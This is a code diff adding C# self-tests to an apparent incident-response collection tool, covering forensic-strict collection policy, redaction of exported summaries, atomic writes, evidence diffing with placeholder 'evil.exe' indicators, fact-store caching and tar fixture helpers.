+                    CollectionImpactPolicy.OutputUnknown,
+                    StringComparison.Ordinal);
+        }
+
+        private static bool CollectionImpactPolicy_strict_restricts_enabled_high_impact_steps()
+        {
+            CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
+                CollectionModeProfileHelper.ForensicStrict,
+                Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test"),
+                true,
+                true,
+                true,
+                true,
+                true);
+
+            return context.OperatorAcknowledgedRisks &&
+                string.Equals(context.OutputTargetClass, CollectionImpactPolicy.OutputSystemDisk, StringComparison.Ordinal) &&
+                context.RestrictedSteps.SequenceEqual(new[]
+                {
+                    CollectionImpactPolicy.MemoryAcquisitionStep,
+                    CollectionImpactPolicy.MemoryAnalysisStep,
+                    CollectionImpactPolicy.DeepScanStep
+                }) &&
+                context.SkippedByProfile.SequenceEqual(new[]
+                {
+                    CollectionImpactPolicy.MemoryAcquisitionStep,
+                    CollectionImpactPolicy.MemoryAnalysisStep
+                }) &&
+                CollectionImpactPolicy.RequiresOperatorAcknowledgment(context);
+        }
+
+        private static bool CollectionImpactPolicy_standard_does_not_restrict_steps()
+        {
+            CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
+                CollectionModeProfileHelper.Standard,
+                Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test"),
+                false,
+                true,
+                true,
+                true,
+                true);
+
+            return context.RestrictedSteps.Count == 0 &&
+                context.SkippedByProfile.Count == 0 &&
+                !CollectionImpactPolicy.RequiresOperatorAcknowledgment(context);
+        }
+
+        private static bool Collector_forensic_strict_without_acknowledgment_is_rejected_before_collection()
+        {
+            CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
+                CollectionModeProfileHelper.ForensicStrict,
+                Path.Combine(Environment.SystemDirectory, "IR_Output_policy_test"),
+                false,
+                true,
+                true,
+                true,
+                true);
+            try
+            {
+                Collector.ValidateCollectionRunContext(context);
+                return false;
+            }
+            catch (InvalidOperationException ex)
+            {
+                return (ex.Message ?? "").IndexOf("risk acknowledgment", StringComparison.OrdinalIgnoreCase) >= 0;
+            }
+        }
+
+        private static bool CollectionCoverage_forensic_policy_metadata_round_trips_and_marks_partial()
+        {
+            string dir = CreateTempDir("IRCollectStrictCoverage_");
+            try
+            {
+                File.WriteAllText(Path.Combine(dir, ArtifactNames.SystemInfoTxt), "ok", new UTF8Encoding(false));
+                CollectionRunContext context = CollectionImpactPolicy.CreateForValues(
+                    CollectionModeProfileHelper.ForensicStrict,
+                    dir,
+                    true,
+                    true,
+                    true,
+                    true,
+                    true);
+                CollectionCoverageReport report = Collector.BuildCollectionCoverageReportForPolicy(
+                    dir,
+                    "StrictCase",
+                    new List<string>(),
+                    context);
+                string path = Path.Combine(dir, ArtifactNames.CollectionCoverageJson);
+                CollectionCoverageSerializer.SaveToFile(report, path);
+                CollectionCoverageReport loaded = CollectionCoverageSerializer.LoadFromFile(path);
+
+                return loaded != null &&
+                    string.Equals(loaded.CollectionModeProfile, CollectionModeProfileHelper.ForensicStrict, StringComparison.Ordinal) &&
+                    loaded.OperatorAcknowledgedRisks &&
+                    string.Equals(loaded.OutputTargetClass, context.OutputTargetClass, StringComparison.Ordinal) &&
+                    loaded.RestrictedSteps.SequenceEqual(context.RestrictedSteps) &&
+                    loaded.SkippedByProfile.SequenceEqual(context.SkippedByProfile) &&
+                    string.Equals(loaded.OverallStatus, "partial", StringComparison.OrdinalIgnoreCase);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool MemoryCollectors_run_policy_writes_skipped_sidecars_without_tools()
+        {
+            string dir = CreateTempDir("IRCollectStrictMemory_");
+            try
+            {
+                MemoryAcquisitionCollector.Collect(dir, true);
+                MemoryAnalysisCollector.Collect(dir, true);
+                MemoryAcquisitionRecord acquisition = MemoryAcquisitionRecord.TryLoad(
+                    Path.Combine(dir, ArtifactNames.MemoryAcquisitionJson));
+                MemoryAnalysisRecord analysis = MemoryAnalysisRecord.TryLoad(
+                    Path.Combine(dir, ArtifactNames.MemoryAnalysisJson));
+
+                return acquisition != null &&
+                    analysis != null &&
+                    string.Equals(acquisition.Status, "skipped", StringComparison.OrdinalIgnoreCase) &&
+                    string.Equals(analysis.Status, "skipped", StringComparison.OrdinalIgnoreCase) &&
+                    (acquisition.Detail ?? "").IndexOf("ForensicStrict", StringComparison.Ordinal) >= 0 &&
+                    (analysis.Detail ?? "").IndexOf("ForensicStrict", StringComparison.Ordinal) >= 0 &&
+                    string.IsNullOrEmpty(acquisition.ToolPath) &&
+                    string.IsNullOrEmpty(analysis.ToolPath);
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool CollectionResult_profile_skip_sets_coverage_gap()
+        {
+            var result = new Collector.CollectionResult
+            {
+                FailedSteps = new List<string>(),
+                CoverageReport = new CollectionCoverageReport
+                {
+                    OverallStatus = "partial",
+                    SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
+                    Steps = new List<CollectionCoverageStep>()
+                }
+            };
+            return result.HasCoverageGaps && !result.HasErrors;
+        }
+
         private static bool ZipUpload_gate_uses_run_profile_ForensicStrict_even_if_settings_Standard()
         {
             var cfg = new ConfigManager();
@@ -2859,6 +5029,11 @@ namespace IR_Collect.Tests
                 EvidenceId = "E-SECRET-001",
                 CollectorUser = @"DOMAIN\secret.user",
                 OverallStatus = "complete",
+                CollectionModeProfile = CollectionModeProfileHelper.ForensicStrict,
+                OperatorAcknowledgedRisks = true,
+                OutputTargetClass = CollectionImpactPolicy.OutputSystemDisk,
+                RestrictedSteps = new List<string> { CollectionImpactPolicy.DeepScanStep },
+                SkippedByProfile = new List<string> { CollectionImpactPolicy.MemoryAcquisitionStep },
                 Steps = new List<CollectionCoverageStep>()
             };
             var payload = new SummaryPayload
@@ -2873,12 +5048,19 @@ namespace IR_Collect.Tests
             bool liveIntact =
                 string.Equals(live.Host, "SECRET-HOSTNAME", StringComparison.Ordinal) &&
                 string.Equals(live.EvidenceId, "E-SECRET-001", StringComparison.Ordinal) &&
-                string.Equals(live.CollectorUser, @"DOMAIN\secret.user", StringComparison.Ordinal);
+                string.Equals(live.CollectorUser, @"DOMAIN\secret.user", StringComparison.Ordinal) &&
+                string.Equals(live.CollectionModeProfile, CollectionModeProfileHelper.ForensicStrict, StringComparison.Ordinal) &&
+                live.OperatorAcknowledgedRisks &&
+                live.RestrictedSteps.SequenceEqual(new[] { CollectionImpactPolicy.DeepScanStep }) &&
+                live.SkippedByProfile.SequenceEqual(new[] { CollectionImpactPolicy.MemoryAcquisitionStep });
             bool jsonRedacted =
                 json.IndexOf("SECRET-HOSTNAME", StringComparison.OrdinalIgnoreCase) < 0 &&
                 json.IndexOf("E-SECRET-001", StringComparison.OrdinalIgnoreCase) < 0 &&
                 json.IndexOf("secret.user", StringComparison.OrdinalIgnoreCase) < 0 &&
-                json.IndexOf("[redacted]", StringComparison.OrdinalIgnoreCase) >= 0;
+                json.IndexOf("[redacted]", StringComparison.OrdinalIgnoreCase) >= 0 &&
+                json.IndexOf("\"collection_mode_profile\":\"ForensicStrict\"", StringComparison.Ordinal) >= 0 &&
+                json.IndexOf("\"output_target_class\":\"system_disk\"", StringComparison.Ordinal) >= 0 &&
+                json.IndexOf("Deep Scan (manual live action)", StringComparison.Ordinal) >= 0;
             return liveIntact && jsonRedacted;
         }
 
@@ -2982,6 +5164,31 @@ namespace IR_Collect.Tests
                 json.IndexOf("path_redacted", StringComparison.OrdinalIgnoreCase) >= 0 &&
                 json.IndexOf("env_redacted", StringComparison.OrdinalIgnoreCase) >= 0;
             return liveArgsUnchanged && jsonNoLeak;
+        }
+
+        private static bool AiRedaction_basic_masks_fact_store_inputs_live_untouched()
+        {
+            const string relativePath = "evidence/Users/alice/AppData/Local/Temp/process_list.csv";
+            var liveInput = new FactStoreInputFingerprint
+            {
+                RelativePath = relativePath,
+                Size = 123,
+                MtimeUtc = DateTime.UtcNow.ToString("o"),
+                Sha256 = new string('b', 64),
+                NormalizerName = "Process"
+            };
+            var payload = new SummaryPayload
+            {
+                ExportSchema = "summary_v3",
+                FactStoreBuildInputs = new List<FactStoreInputFingerprint> { liveInput },
+                FactSamples = new List<Fact>()
+            };
+            var copy = SummaryExport.CloneForSerialization(payload);
+            SummaryPayloadAiRedactor.Apply(copy, "Basic");
+            string json = SummaryExport.Serialize(copy);
+            return string.Equals(liveInput.RelativePath, relativePath, StringComparison.Ordinal) &&
+                json.IndexOf("Users/alice", StringComparison.OrdinalIgnoreCase) < 0 &&
+                json.IndexOf("process_list.csv", StringComparison.OrdinalIgnoreCase) >= 0;
         }
 
         private static bool AiRedaction_strict_clears_fact_samples()
@@ -3587,6 +5794,482 @@ namespace IR_Collect.Tests
                 }
                 TryDeleteDir(dir);
             }
+        }
+
+        private static bool AtomicFile_failure_preserves_published_output_and_cleans_staging()
+        {
+            string dir = Path.Combine(Path.GetTempPath(), "IRCollectAtomic_" + Guid.NewGuid().ToString("N"));
+            string output = Path.Combine(dir, "canonical.csv");
+            try
+            {
+                Directory.CreateDirectory(dir);
+                File.WriteAllText(output, "trusted", new UTF8Encoding(false));
+
+                bool failed = false;
+                try
+                {
+                    AtomicFile.WriteText(output, new UTF8Encoding(false), delegate(StreamWriter writer)
+                    {
+                        writer.Write("partial");
+                        throw new InvalidOperationException("simulated writer failure");
+                    });
+                }
+                catch (InvalidOperationException)
+                {
+                    failed = true;
+                }
+
+                if (!failed || File.ReadAllText(output, Encoding.UTF8) != "trusted")
+                    return false;
+                if (Directory.GetFiles(dir, ".canonical.csv.partial-*.tmp", SearchOption.TopDirectoryOnly).Length != 0)
+                    return false;
+
+                AtomicFile.WriteAllText(output, "complete", new UTF8Encoding(false));
+                return File.ReadAllText(output, Encoding.UTF8) == "complete" &&
+                    Directory.GetFiles(dir, ".canonical.csv.partial-*.tmp", SearchOption.TopDirectoryOnly).Length == 0;
+            }
+            finally
+            {
+                TryDeleteDir(dir);
+            }
+        }
+
+        private static bool DiffBuilder_detects_added_modified_and_reverse_removed_facts()
+        {
+            CaseData baseline = CreateDiffCase("baseline");
+            CaseData target = CreateDiffCase("target");
+
+            baseline.FactStore.Facts.Add(CreateDiffFact("p-good", "Process", "Executed", "Path", @"C:\Windows\good.exe", "good"));
+            target.FactStore.Facts.Add(CreateDiffFact("p-good", "Process", "Executed", "Path", @"C:\Windows\good.exe", "good"));
+
+            baseline.FactStore.Facts.Add(CreateDiffFact("svc-a", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Manual"));
+            target.FactStore.Facts.Add(CreateDiffFact("svc-a", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Auto"));
+
+            target.FactStore.Facts.Add(CreateDiffFact("p-evil", "Process", "Executed", "Path", @"C:\Temp\evil.exe", "evil"));
+            target.FactStore.Facts.Add(CreateDiffFact("autorun-new", "Autorun", "Persist", "RegistryKey", @"HKLM\Software\Run\Evil", "evil autorun"));
+            target.FactStore.Facts.Add(CreateDiffFact("service-new", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcNew", "StartMode=Auto"));
+            target.FactStore.Facts.Add(CreateDiffFact("task-new", "ScheduledTask", "TaskConfigurationObserved", "TaskName", @"\Nine\Evil", "enabled"));
+            target.FactStore.Facts.Add(CreateDiffFact("hash-new", "MFT", "FileObserved", "Hash", new string('a', 64), "new file hash"));
+
+            DiffReport forward = DiffBuilder.Build(baseline, target);
+            if (forward == null || forward.DiffSchema != "diff_v1" || forward.ChangeCount != 6) return false;
+            if (forward.BaselineRef == null || forward.BaselineRef.CollectionCoverageStatus != "complete") return false;
+            if (!HasDiffChange(forward, "Process", "Added", "Path:c:\\temp\\evil.exe")) return false;
+            if (!HasDiffChange(forward, "Persistence", "Added", "RegistryKey:hklm\\software\\run\\evil")) return false;
+            if (!HasDiffChange(forward, "Persistence", "Added", "ServiceName:svcnew")) return false;
+            if (!HasDiffChange(forward, "Persistence", "Added", "TaskName:\\nine\\evil")) return false;
+            if (!HasDiffChange(forward, "File", "Added", "Hash:" + new string('a', 64))) return false;
+            if (!HasDiffChange(forward, "Persistence", "Modified", "ServiceName:svca")) return false;
+            if (forward.Changes.Any(x => string.Equals(x.EntityKey, "Path:c:\\windows\\good.exe", StringComparison.OrdinalIgnoreCase))) return false;
+            DiffChange serviceChange = forward.Changes.FirstOrDefault(x =>
+                string.Equals(x.EntityKey, "ServiceName:svca", StringComparison.OrdinalIgnoreCase));
+            if (serviceChange == null || serviceChange.Confidence != "High") return false;
+            DiffChange processChange = forward.Changes.FirstOrDefault(x =>
+                string.Equals(x.EntityKey, "Path:c:\\temp\\evil.exe", StringComparison.OrdinalIgnoreCase));
+            DiffFactReference processRef = processChange != null ? processChange.TargetFactRefs.FirstOrDefault() : null;
+            if (processRef == null || processRef.ParseLevel != FactProvenanceMetadata.StructuredParseLevel ||
+                processRef.CollectionStatus != "complete" || processRef.SourceFile != "Process.csv") return false;
+
+            DiffReport reverse = DiffBuilder.Build(target, baseline);
+            return reverse.ChangeCount == 6 &&
+                HasDiffChange(reverse, "Process", "Removed", "Path:c:\\temp\\evil.exe") &&
+                HasDiffChange(reverse, "Persistence", "Modified", "ServiceName:svca");
+        }
+
+        private static bool FactStoreBuildCache_reuses_unchanged_case()
+        {
+            string work = CreateTempDir("IRCollectFactCacheReuse_");
+            try
+            {
+                string evidence = Path.Combine(work, "evidence");
+                string cache = Path.Combine(work, "cache");
+                Directory.CreateDirectory(evidence);
+                WriteFactStoreCacheFixtures(evidence, false, false);
+
+                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
+                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
+                if (first.Store == null || first.Store.Count != 2 || first.BuildMode != "Full" ||
+                    !first.CacheWritten || !File.Exists(first.CachePath))
+                    return false;
+
+                CaseData secondCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
+                FactStoreBuildResult second = FactStoreBuildCoordinator.Build(secondCase, true, true, cache);
+                return second.Store != null &&
+                    second.Store.Count == first.Store.Count &&
+                    second.BuildMode == "Reused" &&
+                    second.ReusedGroups.Contains("All") &&
+                    secondCase.FactStoreBuildMode == "Reused";
+            }
+            finally
+            {
+                TryDeleteDir(work);
+            }
+        }
+
+        private static bool FactStoreBuildCache_rebuilds_only_changed_eventlog()
+        {
+            string work = CreateTempDir("IRCollectFactCacheEvent_");
+            try
+            {
+                string evidence = Path.Combine(work, "evidence");
+                string cache = Path.Combine(work, "cache");
+                Directory.CreateDirectory(evidence);
+                WriteFactStoreCacheFixtures(evidence, false, false);
+
+                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
+                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
+                if (first.Store == null || first.Store.Count != 2) return false;
+
+                WriteFactStoreCacheFixtures(evidence, true, false);
+                CaseData changedCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
+                FactStoreBuildResult changed = FactStoreBuildCoordinator.Build(changedCase, true, true, cache);
+                if (changed.Store == null || changed.BuildMode != "Incremental") return false;
+                if (!changed.RebuiltGroups.Contains("EventLog:Security") ||
+                    !changed.ReusedGroups.Contains("Non-EventLog"))
+                    return false;
+
+                int processFacts = changed.Store.Facts.Count(x =>
+                    string.Equals(x.Source, ProcessNormalizer.SourceName, StringComparison.Ordinal));
+                List<Fact> eventFacts = changed.Store.Facts.Where(x =>
+                    string.Equals(x.Source, "EventLog:Security", StringComparison.Ordinal)).ToList();
+                return processFacts == 1 && eventFacts.Count == 2 &&
+                    eventFacts.Any(x => HasEntity(x, "EventId", "1102")) &&
+                    eventFacts.Any(x => HasEntity(x, "EventId", "4624"));
+            }
+            finally
+            {
+                TryDeleteDir(work);
+            }
+        }
+
+        private static bool FactStoreBuildCache_non_event_change_falls_back_full()
+        {
+            string work = CreateTempDir("IRCollectFactCacheFull_");
+            try
+            {
+                string evidence = Path.Combine(work, "evidence");
+                string cache = Path.Combine(work, "cache");
+                Directory.CreateDirectory(evidence);
+                WriteFactStoreCacheFixtures(evidence, false, false);
+
+                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
+                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
+                if (first.Store == null || first.BuildMode != "Full") return false;
+
+                WriteFactStoreCacheFixtures(evidence, false, true);
+                CaseData changedCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
+                FactStoreBuildResult changed = FactStoreBuildCoordinator.Build(changedCase, true, true, cache);
+                int processFacts = changed.Store != null ? changed.Store.Facts.Count(x =>
+                    string.Equals(x.Source, ProcessNormalizer.SourceName, StringComparison.Ordinal)) : 0;
+                return changed.BuildMode == "Full" &&
+                    changed.Detail.IndexOf("require a full rebuild", StringComparison.OrdinalIgnoreCase) >= 0 &&
+                    processFacts == 2;
+            }
+            finally
+            {
+                TryDeleteDir(work);
+            }
+        }
+
+        private static bool FactStoreBuildCache_corrupt_cache_falls_back_full()
+        {
+            string work = CreateTempDir("IRCollectFactCacheCorrupt_");
+            try
+            {
+                string evidence = Path.Combine(work, "evidence");
+                string cache = Path.Combine(work, "cache");
+                Directory.CreateDirectory(evidence);
+                WriteFactStoreCacheFixtures(evidence, false, false);
+
+                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
+                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
+                if (first.Store == null || first.BuildMode != "Full" || !File.Exists(first.CachePath))
+                    return false;
+
+                File.WriteAllText(first.CachePath, "not-a-gzip-cache", new UTF8Encoding(false));
+                CaseData secondCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
+                FactStoreBuildResult second = FactStoreBuildCoordinator.Build(secondCase, true, false, cache);
+                return second.Store != null &&
+                    second.Store.Count == first.Store.Count &&
+                    second.BuildMode == "Full" &&
+                    second.Detail.IndexOf("could not be read", StringComparison.OrdinalIgnoreCase) >= 0;
+            }
+            finally
+            {
+                TryDeleteDir(work);
+            }
+        }
+
+        private static bool FactStoreAutoBuild_rebuilds_stale_store()
+        {
+            var c = new CaseData
+            {
+                FactStore = new FactStore(),
+                FactStoreFreshnessStatus = "fresh"
+            };
+            c.FactStore.AppendFacts(new[]
+            {
+                new Fact("cache-test", DateTime.UtcNow, "Process", "Observed")
+            });
+
+            if (IR_Collect.MainForm.ShouldAutoBuildFactStore("0", c)) return false;
+            if (IR_Collect.MainForm.ShouldAutoBuildFactStore("1", c)) return false;
+            c.FactStoreFreshnessStatus = "stale";
+            return IR_Collect.MainForm.ShouldAutoBuildFactStore("1", c);
+        }
+
+        private static void WriteFactStoreCacheFixtures(string evidence, bool addEvent, bool addProcess)
+        {
+            string processHeader = "PID,Name,Path,CommandLine,StartTime,User,SHA256,SignatureStatus,Signer,PPID,SessionId,ThreadCount,WorkingSetSize\r\n";
+            string processRows = "100,good.exe,C:\\Windows\\good.exe,C:\\Windows\\good.exe,2026-01-01 00:00:00,SYSTEM,,,,,,,\r\n";
+            if (addProcess)
+                processRows += "200,new.exe,C:\\Temp\\new.exe,C:\\Temp\\new.exe,2026-01-01 00:10:00,user,,,,,,,\r\n";
+            File.WriteAllText(Path.Combine(evidence, ArtifactNames.ProcessListCsv), processHeader + processRows, new UTF8Encoding(false));
+
+            string eventDir = Path.Combine(evidence, "EventLogs");
+            Directory.CreateDirectory(eventDir);
+            var rows = new List<string[]>
+            {
+                BuildEventLogRow("2026-01-01T00:01:00Z", "1102", "Microsoft-Windows-Security-Auditing", "Audit log cleared.", "")
+            };
+            if (addEvent)
+                rows.Add(BuildEventLogRow("2026-01-01T00:02:00Z", "4624", "Microsoft-Windows-Security-Auditing", "Logon.", "TargetUserName=alice"));
+            WriteEventLogCsv(Path.Combine(eventDir, "Security_filtered.csv"), rows);
+        }
+
+        private static CaseData CreateFactStoreCacheCase(string evidence, string analysis)
+        {
+            Directory.CreateDirectory(analysis);
+            EvidenceManifestResult manifest = EvidenceManifest.HashFolder(evidence);
+            var c = new CaseData
+            {
+                CaseID = "cache-case",
+                Hostname = "CACHE-HOST",
+                ExtractPath = evidence,
+                EvidencePath = evidence,
+                AnalysisPath = analysis,
+                CachePath = analysis,
+                SourceFormat = "folder",
+                EvidenceFiles = manifest.Files,
+                EvidenceDigest = manifest.Digest
+            };
+            string process = Path.Combine(evidence, ArtifactNames.ProcessListCsv);
+            string eventLog = Path.Combine(evidence, "EventLogs", "Security_filtered.csv");
+            c.Artifacts[ArtifactNames.ProcessListCsv] = process;
+            c.Artifacts[Path.Combine("EventLogs", "Security_filtered.csv")] = eventLog;
+            return c;
+        }
+
+        private static bool DiffCli_compares_readonly_folders_and_writes_diff_v1()
+        {
+            string work = Path.Combine(Path.GetTempPath(), "IRCollectDiffCli_" + Guid.NewGuid().ToString("N"));
+            string baseline = Path.Combine(work, "baseline");
+            string target = Path.Combine(work, "target");
+            string output = Path.Combine(work, "diff.json");
+            try
+            {
+                Directory.CreateDirectory(baseline);
+                Directory.CreateDirectory(target);
+                File.WriteAllText(Path.Combine(baseline, ArtifactNames.SystemInfoTxt), "Hostname: diff-host\r\nOS: Windows", new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(target, ArtifactNames.SystemInfoTxt), "Hostname: diff-host\r\nOS: Windows", new UTF8Encoding(false));
+                string header = "PID,Name,Path,CommandLine,StartTime,User,SHA256,SignatureStatus,Signer,PPID,SessionId,ThreadCount,WorkingSetSize\r\n";
+                string common = "100,good.exe,C:\\Windows\\good.exe,C:\\Windows\\good.exe,2026-01-01 00:00:00,SYSTEM,,,,,,,\r\n";
+                string added = "200,evil.exe,C:\\Temp\\evil.exe,C:\\Temp\\evil.exe -x,2026-01-01 01:00:00,analyst," +
+                    new string('b', 64) + ",,,,,,\r\n";
+                File.WriteAllText(Path.Combine(baseline, ArtifactNames.ProcessListCsv), header + common, new UTF8Encoding(false));
+                File.WriteAllText(Path.Combine(target, ArtifactNames.ProcessListCsv), header + common + added, new UTF8Encoding(false));
+
+                string baselineDigestBefore = EvidenceManifest.HashFolder(baseline).Digest;
+                string targetDigestBefore = EvidenceManifest.HashFolder(target).Digest;
+                var console = new StringWriter();
+                int result = DiffCli.Run(baseline, target, output, console);
+                if (result != 0 || !File.Exists(output)) return false;
+                string json = File.ReadAllText(output, Encoding.UTF8);
+                if (json.IndexOf("\"diff_schema\":\"diff_v1\"", StringComparison.Ordinal) < 0) return false;
+                if (json.IndexOf("evil.exe", StringComparison.OrdinalIgnoreCase) < 0) return false;
+                if (json.IndexOf("\"change_type\":\"Added\"", StringComparison.Ordinal) < 0) return false;
+                if (json.IndexOf("\"collection_coverage_status\"", StringComparison.Ordinal) < 0) return false;
+                if (json.IndexOf("\"parse_level\"", StringComparison.Ordinal) < 0) return false;
+                return baselineDigestBefore == EvidenceManifest.HashFolder(baseline).Digest &&
+                    targetDigestBefore == EvidenceManifest.HashFolder(target).Digest;
+            }
+            finally
+            {
+                TryDeleteDir(work);
+            }
+        }
+
+        private static bool DiffTab_builds_grid_from_loaded_ready_baseline()
+        {
+            MainForm form = null;
+            try
+            {
+                CaseData baseline = CreateDiffCase("ui-baseline");
+                CaseData target = CreateDiffCase("ui-target");
+                baseline.FactStore.Facts.Add(CreateDiffFact("svc", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Manual"));
+                target.FactStore.Facts.Add(CreateDiffFact("svc", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Auto"));
+                target.FactStore.Facts.Add(CreateDiffFact("proc", "Process", "Executed", "Path", @"C:\Temp\new.exe", "new"));
+
+                form = new MainForm();
+                FieldInfo treeField = typeof(MainForm).GetField("treeHosts", BindingFlags.NonPublic | BindingFlags.Instance);
+                if (treeField == null) return false;
+                TreeView tree = treeField.GetValue(form) as TreeView;
+                if (tree == null) return false;
+                tree.Nodes.Add(new TreeNode("baseline") { Tag = baseline });
+                tree.Nodes.Add(new TreeNode("target") { Tag = target });
+
+                MethodInfo method = typeof(MainForm).GetMethod("CreateDiffTab", BindingFlags.NonPublic | BindingFlags.Instance);
+                if (method == null) return false;
+                TabPage tab = method.Invoke(form, new object[] { target }) as TabPage;
+                DataGridView grid = FindDescendantControl<DataGridView>(tab);
+                if (tab == null || grid == null || !string.Equals(tab.Text, "Diff", StringComparison.Ordinal)) return false;
+                if (grid.Rows.Count != 2) return false;
+                var changes = grid.Rows.Cast<DataGridViewRow>()
+                    .Select(row => row.Tag as DiffChange)
+                    .Where(change => change != null)
+                    .ToList();
+                return changes.Count == 2 &&
+                    changes.Any(change => change.ChangeType == "Added" && change.Category == "Process") &&
+                    changes.Any(change => change.ChangeType == "Modified" && change.Category == "Persistence");
+            }
+            finally
+            {
+                if (form != null) form.Dispose();
+            }
+        }
+
+        private static CaseData CreateDiffCase(string id)
+        {
+            return new CaseData
+            {
+                CaseID = id,
+                Hostname = "diff-host",
+                EvidenceDigest = id + "-digest",
+                SourceFormat = "folder",
+                CollectionCoverage = new CollectionCoverageReport { OverallStatus = "complete" },
+                FactStore = new FactStore { CaseId = id, Hostname = "diff-host" }
+            };
+        }
+
+        private static Fact CreateDiffFact(
+            string id,
+            string source,
+            string action,
+            string entityType,
+            string entityValue,
+            string details)
+        {
+            var fact = new Fact(id, DateTime.MinValue, source, action)
+            {
+                Details = details,
+                SourceFile = source + ".csv",
+                RawRef = source + ".csv:2",
+                CollectionStep = source,
+                CollectionStatus = "complete",
+                CollectionPrivilege = "standard",
+                ParseLevel = FactProvenanceMetadata.StructuredParseLevel,
+                ParserNote = "fixture"
+            };
+            fact.AddEntity(entityType, entityValue);
+            return fact;
+        }
+
+        private static bool HasDiffChange(DiffReport report, string category, string changeType, string entityKey)
+        {
+            return report != null && report.Changes != null && report.Changes.Any(x =>
+                string.Equals(x.Category, category, StringComparison.Ordinal) &&
+                string.Equals(x.ChangeType, changeType, StringComparison.Ordinal) &&
+                string.Equals(x.EntityKey, entityKey, StringComparison.OrdinalIgnoreCase));
+        }
+
+        private static void WriteTarGzFromFolder(string root, string archivePath)
+        {
+            using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+            using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
+            {
+                string rootFull = Path.GetFullPath(root).TrimEnd(Path.DirectorySeparatorChar, '/', '\\') + Path.DirectorySeparatorChar;
+                foreach (string path in Directory.EnumerateFiles(root, "*", SearchOption.AllDirectories).OrderBy(x => x, StringComparer.OrdinalIgnoreCase))
+                {
+                    string full = Path.GetFullPath(path);
+                    string relative = full.Substring(rootFull.Length).Replace('\\', '/');
+                    WriteTarEntry(gzip, relative, File.ReadAllBytes(path));
+                }
+                gzip.Write(new byte[1024], 0, 1024);
+            }
+        }
+
+        private static void WriteSingleTarGzEntry(string archivePath, string entryName, byte[] content)
+        {
+            using (FileStream file = new FileStream(archivePath, FileMode.Create, FileAccess.Write, FileShare.None))
+            using (GZipStream gzip = new GZipStream(file, CompressionMode.Compress))
+            {
+                WriteTarEntry(gzip, entryName, content ?? new byte[0]);
+                gzip.Write(new byte[1024], 0, 1024);
+            }
+        }
+
+        private static void WriteTarEntry(Stream output, string name, byte[] content)
+        {
+            WriteTarEntry(output, name, content, '0');
+        }
+
+        private static void WriteTarEntry(Stream output, string name, byte[] content, char type)
+        {
+            byte[] nameBytes = Encoding.UTF8.GetBytes(name ?? "");
+            if (nameBytes.Length == 0 || nameBytes.Length > 100)
+                throw new InvalidOperationException("Self-test TAR entry name is outside the basic ustar limit.");
+
+            byte[] header = new byte[512];
+            Buffer.BlockCopy(nameBytes, 0, header, 0, nameBytes.Length);
+            WriteTarOctal(header, 100, 8, 420);
+            WriteTarOctal(header, 108, 8, 0);
+            WriteTarOctal(header, 116, 8, 0);
+            WriteTarOctal(header, 124, 12, content != null ? content.Length : 0);
+            WriteTarOctal(header, 136, 12, 1785085200);
+            for (int i = 148; i < 156; i++) header[i] = 32;
+            header[156] = (byte)type;
+            Encoding.ASCII.GetBytes("ustar\0").CopyTo(header, 257);
+            Encoding.ASCII.GetBytes("00").CopyTo(header, 263);
+
+            int checksum = 0;
+            for (int i = 0; i < header.Length; i++) checksum += header[i];
+            string checksumText = Convert.ToString(checksum, 8).PadLeft(6, '0');
+            Encoding.ASCII.GetBytes(checksumText).CopyTo(header, 148);
+            header[154] = 0;
+            header[155] = 32;
+
+            output.Write(header, 0, header.Length);
+            if (content != null && content.Length > 0) output.Write(content, 0, content.Length);
+            int remainder = content != null ? content.Length % 512 : 0;
+            if (remainder != 0)
+            {
+                byte[] padding = new byte[512 - remainder];
+                output.Write(padding, 0, padding.Length);
+            }
+        }
+
+        private static byte[] BuildPaxRecord(string key, string value)
+        {
+            string body = (key ?? "") + "=" + (value ?? "") + "\n";
+            int length = Encoding.UTF8.GetByteCount(body) + 3;
+            while (true)
+            {
+                string prefix = length.ToString() + " ";
+                int actual = Encoding.ASCII.GetByteCount(prefix) + Encoding.UTF8.GetByteCount(body);
+                if (actual == length)
+                    return Encoding.UTF8.GetBytes(prefix + body);
+                length = actual;
+            }
+        }
+
+        private static void WriteTarOctal(byte[] buffer, int offset, int length, long value)
+        {
+            string text = Convert.ToString(value, 8);
+            if (text.Length > length - 1)
+                throw new InvalidOperationException("Self-test TAR numeric field overflow.");
+            text = text.PadLeft(length - 1, '0');
+            Encoding.ASCII.GetBytes(text).CopyTo(buffer, offset);
+            buffer[offset + length - 1] = 0;
         }
 
         private static void TryDeleteDir(string path)
